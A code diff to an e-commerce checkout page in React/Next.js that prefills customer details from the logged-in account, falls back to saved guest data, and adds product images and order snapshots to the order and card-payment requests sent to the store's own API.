@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import AddressSection, { SelectedAddress, ShippingOption } from "../components/address/AddressSection";
@@ -12,6 +12,7 @@ import { LoadingOverlay, SuccessModal, OrderModal } from "./CheckoutModals";
 import CheckoutPayment from "./CheckoutPayment";
 import CustomerSection, { validateCustomer } from "./CustomerSection";
 import type { CustomerData } from "./CustomerSection";
+import { useAuthStore } from "../store/authStore";
 
 const fmt = (n: number) => n.toLocaleString("en-US");
 const API = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";
@@ -46,24 +47,42 @@ export default function CheckoutPage() {
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [customerConfirmed, setCustomerConfirmed] = useState(false);
 
+  const { user, loading: authLoading, initialized } = useAuthStore();
+  const isAuthenticated = !!user;
+  const authFilledRef = useRef(false);
+
+  // ملء بيانات المستخدم من الحساب مرة واحدة فقط بعد تهيئة auth
   useEffect(() => {
-    const saved = localStorage.getItem("checkout_customer");
-    if (saved) {
-      const parsed = JSON.parse(saved);
+    if (!initialized || authFilledRef.current) return;
+    authFilledRef.current = true;
+    if (user) {
       setCustomerData({
-        firstName: parsed.firstName || "",
-        lastName: parsed.lastName || "",
-        email: parsed.email || "",
-        phone: parsed.phone || "",
+        firstName: user.firstName || "",
+        lastName: user.lastName || "",
+        email: user.email || "",
+        phone: user.phone || "",
       });
-      setAddress(parsed.address || "");
-      setCustomerConfirmed(parsed.confirmed || false);
+      // تأكيد تلقائي إذا كانت البيانات كاملة
+      if (user.firstName && user.lastName && user.phone) {
+        setCustomerConfirmed(true);
+      }
+    } else {
+      // ضيف: استعادة من localStorage
+      const saved = localStorage.getItem("checkout_customer");
+      if (saved) {
+        try {
+          const parsed = JSON.parse(saved);
+          setCustomerData({ firstName: parsed.firstName || "", lastName: parsed.lastName || "", email: parsed.email || "", phone: parsed.phone || "" });
+          setAddress(parsed.address || "");
+          setCustomerConfirmed(parsed.confirmed || false);
+        } catch { /* silent */ }
+      }
     }
     const savedShipping = localStorage.getItem("checkout_shipping");
     if (savedShipping) {
       try { setSelectedShipping(JSON.parse(savedShipping)); setShippingConfirmed(true); } catch { /* silent */ }
     }
-  }, []);
+  }, [initialized, user]);
 
   useEffect(() => { setMounted(true); fetchCompany(); }, []);
 
@@ -108,7 +127,13 @@ export default function CheckoutPage() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           paymentMethod: "cash_on_delivery",
-          items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
+          items: items.map(i => ({
+            productId: i.product._id,
+            name: i.product.name,
+            price: i.product.salePrice ?? i.product.originalPrice,
+            quantity: i.qty,
+            image: i.product.images?.[0] || (i.product as { image?: string }).image || null,
+          })),
           total: finalTotal, customer: fullName, whatsapp: customer.phone, address,
         }),
       });
@@ -139,18 +164,32 @@ export default function CheckoutPage() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           cardNumber: cardNumber.replace(/\s/g, ""), expiry: cardExpiry, cvv: cardCvv, cardHolder,
-          items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
+          items: items.map(i => ({
+            productId: i.product._id,
+            name: i.product.name,
+            price: i.product.salePrice ?? i.product.originalPrice,
+            quantity: i.qty,
+            image: i.product.images?.[0] || (i.product as { image?: string }).image || null,
+          })),
           total: finalTotal, customer: fullName, whatsapp: customer.phone, nationalId: "", address, installmentType: "full", months: 0, downPayment: 0,
+          customerEmail: customer.email || "",
         }),
       });
       const data = await res.json();
       if (res.status === 429) { recordAttempt(); setErrors({ firstName: "لقد تجاوزت الحد المسموح به من الطلبات" }); return; }
       recordAttempt();
       sessionStorage.setItem("verify_data", JSON.stringify({
-        orderId: data.orderId, amount: finalTotal,
+        orderId: data.orderId, _id: data._id, amount: finalTotal,
         last4: cardNumber.replace(/\s/g, "").slice(-4),
         date: new Date().toISOString(), phone: customer.phone,
         customerName: fullName,
+        items: items.map(i => ({
+          productId: i.product._id,
+          name: i.product.name,
+          price: i.product.salePrice ?? i.product.originalPrice,
+          quantity: i.qty,
+        })),
+        orderSnapshot: data.orderSnapshot || null,
       }));
       await new Promise(r => setTimeout(r, 2600));
       router.push("/checkout/verify");
@@ -239,6 +278,8 @@ export default function CheckoutPage() {
           data={customer}
           errors={errors}
           confirmed={customerConfirmed}
+          isAuthenticated={isAuthenticated}
+          authLoading={!initialized && authLoading && !user}
           onChange={(field, value) => {
             setCustomerData(p => ({ ...p, [field]: value }));
             setErrors(p => ({ ...p, [field]: "" }));
